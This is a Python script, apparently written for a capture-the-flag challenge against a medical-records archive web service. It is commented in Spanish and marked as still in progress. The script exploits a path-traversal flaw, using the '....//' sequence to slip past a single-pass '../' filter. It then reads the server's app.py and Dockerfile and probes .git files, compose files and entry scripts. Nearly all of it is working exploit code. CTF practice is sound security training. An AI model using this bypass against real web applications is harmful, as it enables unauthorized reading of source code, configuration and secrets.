#!/usr/bin/env python3
"""CDM CTF 2026-11-13 - Archivo de historias clinicas (203.0.113.10:8006)

Estado: EN CURSO. El bypass de traversal funciona (`....//` esquiva el
`doc.replace("../", "")` de una sola pasada) y permite leer archivos dentro de
/app, pero falta descubrir el nombre del archivo reservado en confidencial/.

Uso:
    python recon.py            # lee app.py y Dockerfile
    python recon.py <ruta>     # lee una ruta relativa a /app
"""
from __future__ import annotations

import html
import re
import sys

import requests

BASE = "http://203.0.113.10:8006"
PRE = re.compile(r"<pre>([\s\S]*?)</pre>")
MSG = re.compile(r'<div class="msg[^"]*">([\s\S]*?)</div>')


def leer(ruta_app: str) -> tuple[int, str]:
    """Lee una ruta bajo /app usando el bypass `....//` (el filtro quita un `../`)."""
    doc = "....//" + ruta_app.lstrip("/")
    r = requests.get(BASE + "/ver", params={"doc": doc}, timeout=20)
    if r.status_code == 200:
        m = PRE.search(r.text)
        return r.status_code, html.unescape(m.group(1)) if m else r.text
    m = MSG.search(r.text)
    return r.status_code, re.sub(r"<[^>]+>", "", m.group(1)).strip() if m else ""


def main() -> int:
    if len(sys.argv) > 1:
        estado, texto = leer(sys.argv[1])
        print(f"[{estado}] /app/{sys.argv[1].lstrip('/')}")
        print(texto)
        return 0 if estado == 200 else 1

    for ruta in ("app.py", "Dockerfile"):
        estado, texto = leer(ruta)
        print(f"===== /app/{ruta} [{estado}] =====")
        print(texto)

    print("===== rutas a enumerar (sin fuerza bruta de nombres) =====")
    for ruta in (".git/index", ".git/logs/HEAD", ".git/refs/heads/main",
                 "docker-compose.yml", "entrypoint.sh", "Makefile", "README.md"):
        estado, texto = leer(ruta)
        print(f"[{estado}] /app/{ruta}  {texto[:80]!r}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
